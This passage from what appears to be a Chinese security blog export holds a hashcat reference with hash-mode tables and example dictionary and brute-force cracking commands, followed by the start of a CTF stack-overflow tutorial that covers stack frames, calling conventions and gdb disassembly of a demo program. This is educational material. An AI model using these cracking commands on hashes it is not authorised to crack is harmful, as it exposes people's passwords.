SHA-224                                          | 纯Hash                                  |\n| 1400  | SHA-256                                          | 纯Hash                                  |\n| 10800 | SHA-384                                          | 纯Hash                                  |\n| 1700  | SHA-512                                          | 纯Hash                                  |\n| 5000  | SHA-3 (Keccak)                                   | 纯Hash                                  |\n| 10100 | SipHash                                          | 纯Hash                                  |\n| 6000  | RIPEMD-160                                       | 纯Hash                                  |\n| 6100  | Whirlpool                                        | 纯Hash                                  |\n| 6900  | GOST R 34.11-94                                  | 纯Hash                                  |\n| 11700 | GOST R 34.11-2012 (Streebog) 256-bit             | 纯Hash                                  |\n| 11800 | GOST R 34.11-2012 (Streebog) 512-bit             | 纯Hash                                  |\n| 10    | md5($pass.$salt)                                 | 纯Hash，盐 且/或 多次迭代               |\n| 20    | md5($salt.$pass)                                 | 纯Hash，盐 且/或 多次迭代               |\n| 30    | md5(unicode($pass).$salt)                        | 纯Hash，盐 且/或 多次迭代               |\n| 40    | md5($salt.unicode($pass))                        | 纯Hash，盐 且/或 多次迭代               |\n| 3800  | md5($salt.$pass.$salt)                           | 纯Hash，盐 且/或 多次迭代               |\n| 3710  | md5($salt.md5($pass))                            | 纯Hash，盐 且/或 多次迭代               |\n| 4010  | md5($salt.md5($salt.$pass))                      | 纯Hash，盐 且/或 多次迭代               |\n| 4110  | md5($salt.md5($pass.$salt))                      | 纯Hash，盐 且/或 多次迭代               |\n| 2600  | md5(md5($pass))                                  | 纯Hash，盐 且/或 多次迭代               |\n| 3910  | md5(md5($pass).md5($salt))                       | 纯Hash，盐 且/或 多次迭代               |\n| 4300  | md5(strtoupper(md5($pass)))                      | 纯Hash，盐 且/或 多次迭代               |\n| 4400  | md5(sha1($pass))                                 | 纯Hash，盐 且/或 多次迭代               |\n| 110   | sha1($pass.$salt)                                | 纯Hash，盐 且/或 多次迭代               |\n| 120   | sha1($salt.$pass)                                | 纯Hash，盐 且/或 多次迭代               |\n| 130   | sha1(unicode($pass).$salt)                       | 纯Hash，盐 且/或 多次迭代               |\n| 140   | sha1($salt.unicode($pass))                       | 纯Hash，盐 且/或 多次迭代               |\n| 4500  | sha1(sha1($pass))                                | 纯Hash，盐 且/或 多次迭代               |\n| 4520  | sha1($salt.sha1($pass))                          | 纯Hash，盐 且/或 多次迭代               |\n| 4700  | sha1(md5($pass))                                 | 纯Hash，盐 且/或 多次迭代               |\n| 4900  | sha1($salt.$pass.$salt)                          | 纯Hash，盐 且/或 多次迭代               |\n| 14400 | sha1(CX)                                         | 纯Hash，盐 且/或 多次迭代               |\n| 1410  | sha256($pass.$salt)                              | 纯Hash，盐 且/或 多次迭代               |\n| 1420  | sha256($salt.$pass)                              | 纯Hash，盐 且/或 多次迭代               |\n| 1430  | sha256(unicode($pass).$salt)                     | 纯Hash，盐 且/或 多次迭代               |\n| 1440  | sha256($salt.unicode($pass))                     | 纯Hash，盐 且/或 多次迭代               |\n| 1710  | sha512($pass.$salt)                              | 纯Hash，盐 且/或 多次迭代               |\n| 1720  | sha512($salt.$pass)                              | 纯Hash，盐 且/或 多次迭代               |\n| 1730  | sha512(unicode($pass).$salt)                     | 纯Hash，盐 且/或 多次迭代               |\n| 1740  | sha512($salt.unicode($pass))                     | 纯Hash，盐 且/或 多次迭代               |\n| 50    | HMAC-MD5 (key = $pass)                           | 纯Hash，认证的                          |\n| 60    | HMAC-MD5 (key = $salt)                           | 纯Hash，认证的                          |\n| 150   | HMAC-SHA1 (key = $pass)                          | 纯Hash，认证的                          |\n| 160   | HMAC-SHA1 (key = $salt)                          | 纯Hash，认证的                          |\n| 1450  | HMAC-SHA256 (key = $pass)                        | 纯Hash，认证的                          |\n| 1460  | HMAC-SHA256 (key = $salt)                        | 纯Hash，认证的                          |\n| 1750  | HMAC-SHA512 (key = $pass)                        | 纯Hash，认证的                          |\n| 1760  | HMAC-SHA512 (key = $salt)                        | 纯Hash，认证的                          |\n| 14000 | DES (PT = $salt, key = $pass)                    | 纯加密，已知的明文攻击                  |\n| 14100 | 3DES (PT = $salt, key = $pass)                   | 纯加密，已知的明文攻击                  |\n| 14900 | Skip32 (PT = $salt, key = $pass)                 | 纯加密，已知的明文攻击                  |\n| 400   | phpass                                           | 通用密钥导出函数(KDF)                   |\n| 8900  | scrypt                                           | 通用密钥导出函数(KDF)                   |\n| 11900 | PBKDF2-HMAC-MD5                                  | 通用密钥导出函数(KDF)                   |\n| 12000 | PBKDF2-HMAC-SHA1                                 | 通用密钥导出函数(KDF)                   |\n| 10900 | PBKDF2-HMAC-SHA256                               | 通用密钥导出函数(KDF)                   |\n| 12100 | PBKDF2-HMAC-SHA512                               | 通用密钥导出函数(KDF)                   |\n| 23    | Skype                                            | 网络协议                                |\n| 2500  | WPA/WPA2                                         | 网络协议                                |\n| 4800  | iSCSI CHAP authentication, MD5(CHAP)             | 网络协议                                |\n| 5300  | IKE-PSK MD5                                      | 网络协议                                |\n| 5400  | IKE-PSK SHA1                                     | 网络协议                                |\n| 5500  | NetNTLMv1                                        | 网络协议                                |\n| 5500  | NetNTLMv1+ESS                                    | 网络协议                                |\n| 5600  | NetNTLMv2                                        | 网络协议                                |\n| 7300  | IPMI2 RAKP HMAC-SHA1                             | 网络协议                                |\n| 7500  | Kerberos 5 AS-REQ Pre-Auth etype 23              | 网络协议                                |\n| 8300  | DNSSEC (NSEC3)                                   | 网络协议                                |\n| 10200 | CRAM-MD5                                         | 网络协议                                |\n| 11100 | PostgreSQL CRAM (MD5)                            | 网络协议                                |\n| 11200 | MySQL CRAM (SHA1)                                | 网络协议                                |\n| 11400 | SIP digest authentication (MD5)                  | 网络协议                                |\n| 13100 | Kerberos 5 TGS-REP etype 23                      | 网络协议                                |\n| 121   | SMF (Simple Machines Forum) > v1.1               | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 400   | phpBB3 (MD5)                                     | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2611  | vBulletin < v3.8.5                               | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2711  | vBulletin >= v3.8.5                              | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2811  | MyBB 1.2+                                        | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2811  | IPB2+ (Invision Power Board)                     | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 8400  | WBB3 (Woltlab Burning Board)                     | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 11    | Joomla < 2.5.18                                  | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 400   | Joomla >= 2.5.18 (MD5)                           | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 400   | WordPress (MD5)                                  | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2612  | PHPS                                             | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 7900  | Drupal7                                          | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 21    | osCommerce                                       | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 21    | xt:Commerce                                      | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 11000 | PrestaShop                                       | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 124   | Django (SHA-1)                                   | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 10000 | Django (PBKDF2-SHA256)                           | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 3711  | MediaWiki B type                                 | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 13900 | OpenCart                                         | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 4521  | Redmine                                          | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 4522  | PunBB                                            | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 12    | PostgreSQL                                       | 数据库服务器                            |\n| 131   | MSSQL (2000)                                     | 数据库服务器                            |\n| 132   | MSSQL (2005)                                     | 数据库服务器                            |\n| 1731  | MSSQL (2012, 2014)                               | 数据库服务器                            |\n| 200   | MySQL323                                         | 数据库服务器                            |\n| 300   | MySQL4.1/MySQL5                                  | 数据库服务器                            |\n| 3100  | Oracle H: Type (Oracle 7+)                       | 数据库服务器                            |\n| 112   | Oracle S: Type (Oracle 11+)                      | 数据库服务器                            |\n| 12300 | Oracle T: Type (Oracle 12+)                      | 数据库服务器                            |\n| 8000  | Sybase ASE                                       | 数据库服务器                            |\n| 141   | Episerver 6.x < .NET 4                           | HTTP，SMTP，LDAP服务器                  |\n| 1441  | Episerver 6.x >= .NET 4                          | HTTP，SMTP，LDAP服务器                  |\n| 1600  | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP，SMTP，LDAP服务器                  |\n| 12600 | ColdFusion 10+                                   | HTTP，SMTP，LDAP服务器                  |\n| 1421  | hMailServer                                      | HTTP，SMTP，LDAP服务器                  |\n| 101   | nsldap, SHA-1(Base64), Netscape LDAP SHA         | HTTP，SMTP，LDAP服务器                  |\n| 111   | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | HTTP，SMTP，LDAP服务器                  |\n| 1411  | SSHA-256(Base64), LDAP {SSHA256}                 | HTTP，SMTP，LDAP服务器                  |\n| 1711  | SSHA-512(Base64), LDAP {SSHA512}                 | HTTP，SMTP，LDAP服务器                  |\n| 15000 | FileZilla Server >= 0.9.55                       | FTP 服务器                              |\n| 11500 | CRC32                                            | 校验和                                  |\n| 3000  | LM                                               | 操作系统                                |\n| 1000  | NTLM                                             | 操作系统                                |\n| 1100  | Domain Cached Credentials (DCC), MS Cache        | 操作系统                                |\n| 2100  | Domain Cached Credentials 2 (DCC2), MS Cache 2   | 操作系统                                |\n| 12800 | MS-AzureSync  PBKDF2-HMAC-SHA256                 | 操作系统                                |\n| 1500  | descrypt, DES (Unix), Traditional DES            | 操作系统                                |\n| 12400 | BSDiCrypt, Extended DES                          | 操作系统                                |\n| 500   | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | 操作系统                                |\n| 3200  | bcrypt $2*$, Blowfish (Unix)                     | 操作系统                                |\n| 7400  | sha256crypt $5$, SHA256 (Unix)                   | 操作系统                                |\n| 1800  | sha512crypt $6$, SHA512 (Unix)                   | 操作系统                                |\n| 122   | OSX v10.4, OSX v10.5, OSX v10.6                  | 操作系统                                |\n| 1722  | OSX v10.7                                        | 操作系统                                |\n| 7100  | OSX v10.8+ (PBKDF2-SHA512)                       | 操作系统                                |\n| 6300  | AIX {smd5}                                       | 操作系统                                |\n| 6700  | AIX {ssha1}                                      | 操作系统                                |\n| 6400  | AIX {ssha256}                                    | 操作系统                                |\n| 6500  | AIX {ssha512}                                    | 操作系统                                |\n| 2400  | Cisco-PIX MD5                                    | 操作系统                                |\n| 2410  | Cisco-ASA MD5                                    | 操作系统                                |\n| 500   | Cisco-IOS $1$ (MD5)                              | 操作系统                                |\n| 5700  | Cisco-IOS type 4 (SHA256)                        | 操作系统                                |\n| 9200  | Cisco-IOS $8$ (PBKDF2-SHA256)                    | 操作系统                                |\n| 9300  | Cisco-IOS $9$ (scrypt)                           | 操作系统                                |\n| 22    | Juniper NetScreen/SSG (ScreenOS)                 | 操作系统                                |\n| 501   | Juniper IVE                                      | 操作系统                                |\n| 15100 | Juniper/NetBSD sha1crypt                         | 操作系统                                |\n| 7000  | FortiGate (FortiOS)                              | 操作系统                                |\n| 5800  | Samsung Android Password/PIN                     | 操作系统                                |\n| 13800 | Windows Phone 8+ PIN/password                    | 操作系统                                |\n| 8100  | Citrix NetScaler                                 | 操作系统                                |\n| 8500  | RACF                                             | 操作系统                                |\n| 7200  | GRUB 2                                           | 操作系统                                |\n| 9900  | Radmin2                                          | 操作系统                                |\n| 125   | ArubaOS                                          | 操作系统                                |\n| 7700  | SAP CODVN B (BCODE)                              | 企业应用软件（EAS）                     |\n| 7800  | SAP CODVN F/G (PASSCODE)                         | 企业应用软件（EAS）                     |\n| 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | 企业应用软件（EAS）                     |\n| 8600  | Lotus Notes/Domino 5                             | 企业应用软件（EAS）                     |\n| 8700  | Lotus Notes/Domino 6                             | 企业应用软件（EAS）                     |\n| 9100  | Lotus Notes/Domino 8                             | 企业应用软件（EAS）                     |\n| 133   | PeopleSoft                                       | 企业应用软件（EAS）                     |\n| 13500 | PeopleSoft PS_TOKEN                              | 企业应用软件（EAS）                     |\n| 11600 | 7-Zip                                            | 压缩/存档                               |\n| 12500 | RAR3-hp                                          | 压缩/存档                               |\n| 13000 | RAR5                                             | 压缩/存档                               |\n| 13200 | AxCrypt                                          | 压缩/存档                               |\n| 13300 | AxCrypt in-memory SHA1                           | 压缩/存档                               |\n| 13600 | WinZip                                           | 压缩/存档                               |\n| 14700 | iTunes 备份 < 10.0                               | 备份                                    |\n| 14800 | iTunes 备份 >= 10.0                              | 备份                                    |\n| 62XY  | TrueCrypt                                        | 全盘加密（FDE）                         |\n| X     | 1 = PBKDF2-HMAC-RIPEMD160                        | 全盘加密（FDE）                         |\n| X     | 2 = PBKDF2-HMAC-SHA512                           | 全盘加密（FDE）                         |\n| X     | 3 = PBKDF2-HMAC-Whirlpool                        | 全盘加密（FDE）                         |\n| X     | 4 = PBKDF2-HMAC-RIPEMD160 + boot-mode            | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure AES                        | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure Serpent                    | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure Twofish                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure AES                        | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure Serpent                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure Twofish                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded AES-Twofish            | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded Serpent-AES            | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded Twofish-Serpent        | 全盘加密（FDE）                         |\n| Y     | 3 = XTS 1536 bit all                             | 全盘加密（FDE）                         |\n| 8800  | Android FDE <= 4.3                               | 全盘加密（FDE）                         |\n| 12900 | Android FDE (Samsung DEK)                        | 全盘加密（FDE）                         |\n| 12200 | eCryptfs                                         | 全盘加密（FDE）                         |\n| 137XY | VeraCrypt                                        | 全盘加密（FDE）                         |\n| X     | 1 = PBKDF2-HMAC-RIPEMD160                        | 全盘加密（FDE）                         |\n| X     | 2 = PBKDF2-HMAC-SHA512                           | 全盘加密（FDE）                         |\n| X     | 3 = PBKDF2-HMAC-Whirlpool                        | 全盘加密（FDE）                         |\n| X     | 4 = PBKDF2-HMAC-RIPEMD160 + boot-mode            | 全盘加密（FDE）                         |\n| X     | 5 = PBKDF2-HMAC-SHA256                           | 全盘加密（FDE）                         |\n| X     | 6 = PBKDF2-HMAC-SHA256 + boot-mode               | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure AES                        | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure Serpent                    | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure Twofish                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure AES                        | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure Serpent                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure Twofish                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded AES-Twofish            | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded Serpent-AES            | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded Twofish-Serpent        | 全盘加密（FDE）                         |\n| Y     | 3 = XTS 1536 bit all                             | 全盘加密（FDE）                         |\n| 14600 | LUKS                                             | 全盘加密（FDE）                         |\n| 9700  | MS Office <= 2003 $0/$1, MD5 + RC4               | 文档                                    |\n| 9710  | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1  | 文档                                    |\n| 9720  | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2  | 文档                                    |\n| 9800  | MS Office <= 2003 $3/$4, SHA1 + RC4              | 文档                                    |\n| 9810  | MS Office <= 2003 $3/$4, SHA1 + RC4, collider #1 | 文档                                    |\n| 9820  | MS Office <= 2003 $3/$4, SHA1 + RC4, collider #2 | 文档                                    |\n| 9400  | MS Office 2007                                   | 文档                                    |\n| 9500  | MS Office 2010                                   | 文档                                    |\n| 9600  | MS Office 2013                                   | 文档                                    |\n| 10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | 文档                                    |\n| 10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | 文档                                    |\n| 10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | 文档                                    |\n| 10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | 文档                                    |\n| 10600 | PDF 1.7 Level 3 (Acrobat 9)                      | 文档                                    |\n| 10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | 文档                                    |\n| 9000  | Password Safe v2                                 | 密码管理软件                            |\n| 5200  | Password Safe v3                                 | 密码管理软件                            |\n| 6800  | LastPass + LastPass sniffed                      | 密码管理软件                            |\n| 6600  | 1Password, agilekeychain                         | 密码管理软件                            |\n| 8200  | 1Password, cloudkeychain                         | 密码管理软件                            |\n| 11300 | Bitcoin/Litecoin wallet.dat                      | 密码管理软件                            |\n| 12700 | Blockchain, My Wallet                            | 密码管理软件                            |\n| 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | 密码管理软件                            |\n| 99999 | Plaintext                                        | Blockchain明文，我的钱包                |\n\n### ③ 输出格式\n\n| 编号 | 格式                                  |\n| ---- | ------------------------------------- |\n| 1    | hash[:salt]                           |\n| 2    | plain                                 |\n| 3    | hash[:salt]:plain                     |\n| 4    | hex_plain                             |\n| 5    | hash[:salt]:hex_plain                 |\n| 6    | plain:hex_plain                       |\n| 7    | hash[:salt]:plain:hex_plain           |\n| 8    | crackpos                              |\n| 9    | hash[:salt]:crack_pos                 |\n| 10   | plain:crack_pos                       |\n| 11   | hash[:salt]:plain:crack_pos           |\n| 12   | hex_plain:crack_pos                   |\n| 13   | hash[:salt]:hex_plain:crack_pos       |\n| 14   | plain:hex_plain:crack_pos             |\n| 15   | hash[:salt]:plain:hex_plain:crack_pos |\n\n### ④ 调试模式规则\n\n| 编号 | 格式                     |\n| ---- | ------------------------ |\n| 1    | 查找规则                 |\n| 2    | 原始词                   |\n| 3    | 原始词:查找规则          |\n| 4    | 原始词:查找规则:已处理词 |\n\n### ⑤ 攻击模式\n\n| 编号 | 模式             |\n| ---- | ---------------- |\n| 0    | 直接             |\n| 1    | 组合             |\n| 3    | 暴力穷举         |\n| 6    | 混合 字典 + 掩码 |\n| 7    | 混合 掩码 + 字典 |\n\n### ⑥ 内置字符集\n\n| ?    | 字符集                       |      |\n| ---- | ---------------------------- | ---- |\n| l    | abcdefghijklmnopqrstuvwxyz   |      |\n| u    | ABCDEFGHIJKLMNOPQRSTUVWXYZ   |      |\n| d    | 0123456789                   |      |\n| h    | 0123456789abcdef             |      |\n| H    | 0123456789ABCDEF             |      |\n| s    | !\"#$%&'()*+,-./:;<=>?@[]^_`{ | }~   |\n| a    | ?l?u?d?s                     |      |\n| b    | 0x00 - 0xff                  |      |\n\n### ⑦ OpenCL设备类型\n\n| 编号 | 设备类型                                                     |\n| ---- | ------------------------------------------------------------ |\n| 1    | CPU                                                          |\n| 2    | GPU                                                          |\n| 3    | 现场可编程门阵列(FPGA)，数字信号处理器(DSP)，协处理器(Co-Processor) |\n\n### ⑧ 工作负载配置文件\n\n| 编号 | 性能 | 运行时间 | 能量消耗 | 桌面影响 |\n| ---- | ---- | -------- | -------- | -------- |\n| 1    | 低   | 2 ms     | 低       | 最小     |\n| 2    | 默认 | 12 ms    | 经济型   | 可察觉   |\n| 3    | 高   | 96 ms    | 高       | 没有反应 |\n| 4    | 噩梦 | 480 ms   | 疯狂的   | 无法控制 |\n\n### ⑨ 基本用例\n\n| 攻击模式  | Hash种类 | 示例命令                                                     |\n| --------- | -------- | ------------------------------------------------------------ |\n| 字典      | $P$      | hashcat -a 0 -m 400 example400.hash example.dict             |\n| 字典+规则 | MD5      | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule |\n| 暴力穷举  | MD5      | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a                 |\n| 组合      | MD5      | hashcat -a 1 -m 0 example0.hash example.dict example.dict    |\n\n","tags":[{"name":"Wireless","slug":"Wireless","permalink":"http://www.killshadow.xyz/tags/Wireless/"}]},{"title":"1.1-菜鸟学PWN之栈溢出学习","date":"2018-10-09T16:00:00.000Z","path":"2018/10/10/1.1-菜鸟学PWN之栈溢出学习/","raw":"---\ntitle: 1.1-菜鸟学PWN之栈溢出学习\ndate: 2018-10-10\ncategories:\ntoc: ture\ntags:\n\t- PWN\n\t- CTF\ncomments: true\n---\n\n\n> 实现栈溢出的两个条件:\n>\n> - 程序有向栈写入数据的行为\n> - 程序并不限制写入数据的长度\n>\n<!-- more -->\n> 如果想用栈溢出来执行攻击指令, 就要在溢出数据内包含攻击指令的内容或地址, 并且要将程序控制权交给该指令. \n> 攻击指令可以是自定义的指令, 也可以利用系统内已有的函数及指令.\n>\n\n\n\n\n## 0x10 背景知识\n\n### 0x11 栈介绍\n\n栈是一种典型的**先进后出(First in Last Out)**的数据结构, 其操作主要有压栈(push)与出栈(pop)两种操作. **两种操作都是操作栈顶**, 当然也有栈底(位于高地址).\n\n![基本栈操作](Data_stack.png)\n\n每个程序在运行时都有虚拟地址空间, 其中某一部分就是该程序对应的栈. 编译器使用堆栈**传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量**. 程序的栈都是**从进程地址空间的高地址向低地址增长**.\n\n\n\n----------------------\n\n### 0x12 栈帧结构\n\n函数调用经常是**嵌套**的, 在同一时刻, 堆栈中会有多个函数的信息. 每个未完成运行的函数占用一个**独立的连续区域**, 称作**栈帧(Stack Frame)**. 当函数被调用时, 栈帧被压入堆栈; 当函数返回时, 栈帧从堆栈中弹出. 栈帧存放函数的参数、函数返回地址、调用者(caller)的一些寄存器状态、函数的局部变量等.\n\n栈帧的边界由栈帧基地址指针EBP和栈帧堆栈指针ESP界定(指正存放在相应寄存器中). EBP指向栈帧底部(高地址), 在当前栈帧内位置固定; ESP指向栈帧顶部(低地址), 当程序执行时ESP会随着数据的入栈和出栈而移动(如: 压入局部变量). 因此函数中对数据的访问大部分是基于EBP(对EBP取相对地址). 函数调用栈典型内存分布如下图:\n\n![img](271650059007975.jpg)\n\n> 注意: 当函数被调用时, EBP的地址是当前栈帧的基地址, 但EBP指向的是上一栈帧基地址的地址.\n\n\n\n#### (1) 入栈出栈指令\n\n函数序(入栈)实现如下：\n\n|  **指令序列**           |                           **含义**            |\n| :-------------------: | :-------------------------------------------- |\n|   push %ebp    | 将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧 |\n| mov %esp, %ebp | 将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶 |\n| sub <n>, %esp  | 将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。<n>为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术) |\n|    push <r>    | 可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值 |\n| ................................. |  |\n\n函数跋(出栈)实现如下:\n\n|           **指令序列**            | **含义**                                                     |\n| :-------------------------------: | :----------------------------------------------------------- |\n|              pop <r>              | 可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值 |\n|          mov %ebp, %esp*          | 恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理) |\n|             pop %ebp*             | 主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处 |\n|                ret                | 从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈 |\n| ................................. | *：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。 |\n\n\n\n#### (2) 参数压栈指令\n\n 参数压栈指令因编译器而异，如下两种压栈方式基本等效：\n\n```c\nextern CdeclDemo(int w, int x, int y, intz);  //调用CdeclDemo函数\nCdeclDemo(1, 2, 3, 4);  //调用CdeclDemo函数\n```\n\n| **压栈方式一**                                              | **压栈方式二**                                 |\n| ----------------------------------------------------------- | ---------------------------------------------- |\n| pushl 4  //压入参数z                                        | *subl   $16, %esp* //多次调用仅执行一遍        |\n| pushl 3  //压入参数y                                        | movl  $4, 12(%esp) //传送参数z至堆栈第四个位置 |\n| pushl 2  //压入参数x                                        | movl  $3, 8(%esp) //传送参数y至堆栈第三个位置  |\n| pushl 1  //压入参数w                                        | movl  $2, 4(%esp) //传送参数x至堆栈第二个位置  |\n| call CdeclDemo  //调用函数                                  | movl  $1, (%esp) //传送参数w至堆栈栈顶         |\n| addl $16, %esp  //恢复ESP原值，使其指向调用前保存的返回地址 | call CdeclDemo  //调用函数                     |\n\n​     两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。\n\n\n\n---------------------------\n\n### 0x13 函数调用栈\n\n**函数调用栈**是指程序运行时内存一段连续的区域, 用来保存函数运行时的状态信息, 包括函数参数与局部变量等. 称之为\"栈\"是因为发生函数调用时, 调用函数(caller)的被保存在栈内, 被调用函数(callee)的状态被压入调用栈的栈顶; 在函数调用结束时, 栈顶的函数(callee)状态被弹出, 栈顶恢复到调用函数(caller)的状态. 函数调用栈在内存中从高地址向低地址生长, 所以栈顶对应的内存在压栈时变小, 出栈时变大.\n\n> 函数调用发生和结束的调用栈帧如下图:\n>\n> ![img](v2-8d5649c36458080223084d77abbd554a_hd.jpg)\n>\n> 函数状态主要涉及三个寄存器--esp, ebp, eip:\n>  - esp 用来存储函数调用栈(caller)的栈顶指针, 在压栈(入栈)和退栈(出栈)时发生变化.\n>  - ebp 用来存储当前函数状态的基地址, 在函数运行时不变, 可以用来索引确定函数参数或局部变量的位置.\n>  - eip 用来存储即将执行的程序指令的地址, cpu依照eip的存储内容读取指令并执行, eip随之指向相邻的下一条指令. EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。\n\n分析demo源代码:\n\n```c\n/*************************************************************************\n\t> File Name: debugfunc.c\n\t> Author: killshadow\n\t> Mail: chaceli@foxmail.com\n\t> Created Time: 2018年09月02日 星期日 09时26分02秒\n ************************************************************************/\n\n#include<stdio.h>\n\nint calc(int a, int b){\n    int c;\n    int d = 2;\n    c = a*d +b;\n    return c;\n}\n\nint main(){\n    int a = 5;\n    int b;\n    int c;\n    printf(\"Please input a number:\\n\");\n    scanf(\"%d\",&b);\n    c = calc(a,b);\n    printf(\"Result: %d\\n\",c);\n    return 0;\n}\n```\n\n然后在命令行中:\n\n```bash\ngcc -m32 debugfunc.c -o debugfunc32 # -m32表示编译成32位的程序\n```\n\n\n\n#### (1) 函数调用压栈顺序\n\n\n> 1. 调用者压入需要保存的寄存器(通常这些寄存器包括 EAX，ECX 和 EDX等)\n> 2. 按照从右往左的顺序压入参数(这个可能有特殊情况, 详情请看[C语言函数调用栈(二)](http://www.cnblogs.com/clover-toeic/p/3756668.html))\n> 3. 返回地址\n> 4. 调用者的 EBP\n> 5. 局部变量\n> 6. 被调用者本身压入需要保存的寄存器， 通常这些寄存器包括 EBX，ESI 和 EDI 等\n\n1) 被调用函数(callee)的**参数**按照**逆序**依次压入栈内. 如果callee没有参数, 则无需此操作. 这些参数仍会保存在调用函数(caller)的函数状态内, 之后压入栈内的数据都会作为被调用函数(callee)的函数状态来保存.\n\n   ![img](v2-9125ba203edd2bab1308ad88db2ae197_hd.jpg)\n\n   ```assembly\n       0x8048552 <main+68>        add    esp, 0x10\n       0x8048555 <main+71>        mov    eax, DWORD PTR [ebp-0x18]\n       0x8048558 <main+74>        sub    esp, 0x8\n    →  0x804855b <main+77>        push   eax\t# $eax : 0x17(即:23,自己输入的数据)\n       0x804855c <main+78>        push   DWORD PTR [ebp-0x14] # ebp为main函数栈基址,-0x14便是int a的栈地址,此处是压入a的值到calc调用栈\n       0x804855f <main+81>        call   0x80484eb <calc>\n       0x8048564 <main+86>        add    esp, 0x10\n       0x8048567 <main+89>        mov    DWORD PTR [ebp-0x10], eax\n       0x804856a <main+92>        sub    esp, 0x8\n   ```\n\n   ![1538817009439](1538817009439.png)\n\n2) 然后将调用函数(caller)进行调用之后的**下一条指令地址作为返回地址压入栈内**. 这样调用函数(caller)的eip(指令)信息得以保存.(这一操作是隐式的, 在执行call命令时就已经push了return的值了)\n\n   ![img](v2-9ae4f530296d4a8ec7d44443e3e6d37f_hd.jpg)\n\n   在gdb里`step into`进`calc`函数, 当执行到`push ebp`的时候, 能看到前面的两个参数和返回地址已经被push到当前函数(即`calc`)的栈帧, 如下图:\n\n   ![1538825556293](1538825556293.png)\n\n3) 再将当前的**ebp寄存器的值(也就是调用函数[caller]的基地址)压入栈**内, 并将**ebp寄存器的值更新为当前栈顶(esp)的地址**. 这样调用函数(caller)的ebp(基地址)信息得以保存. 同时, 